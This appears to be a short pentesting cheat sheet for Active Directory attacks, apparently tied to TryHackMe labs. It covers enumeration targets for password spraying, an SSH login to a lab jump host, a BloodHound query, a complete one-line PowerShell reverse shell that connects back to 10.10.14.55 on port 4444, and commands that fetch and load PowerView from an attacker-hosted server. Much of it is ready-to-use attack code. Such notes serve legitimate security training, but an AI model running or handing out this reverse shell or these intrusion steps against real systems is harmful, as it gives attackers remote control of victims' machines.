### Key Data points
|**Data Point**|**Description**|
|---|---|
|`AD Users`|We are trying to enumerate valid user accounts we can target for password spraying.|
|`AD Joined Computers`|Key Computers include Domain Controllers, file servers, SQL servers, web servers, Exchange mail servers, database servers, etc.|
|`Key Services`|Kerberos, NetBIOS, LDAP, DNS|
|`Vulnerable Hosts and Services`|Anything that can be a quick win. ( a.k.a an easy host to exploit and gain a foothold)|

### SSH AD
```
ssh za.tryhackme.com\\<AD Username>@thmjmp1.za.tryhackme.com
```
### Bloodhound Custom Query
``` bash
#Enumerate the Remote Management Users Group (IMPORTANT?)
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
### Powershell -> Reverse Shell
``` powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.55',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### PowerView Download and Import Module
``` powershell
#host webserver in kali where powerview.ps1 is /Are/Pentest/powerview
#And download from powershell
Invoke-WebRequest http://<IP>:<PORT>/PowerView.ps1 -OutFile PowerView.ps1
#Import module
. .\PowerView.ps1
```